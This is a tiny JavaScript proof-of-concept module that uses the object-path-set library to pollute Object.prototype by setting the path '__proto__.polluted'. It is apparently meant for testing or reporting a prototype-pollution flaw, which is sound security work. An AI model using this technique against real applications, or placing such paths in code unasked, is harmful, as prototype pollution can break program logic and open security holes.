const setPath = require("object-path-set");

function exploitFunction(obj) {
    setPath(obj, "__proto__.polluted", "yes");
}

module.exports = { exploitFunction };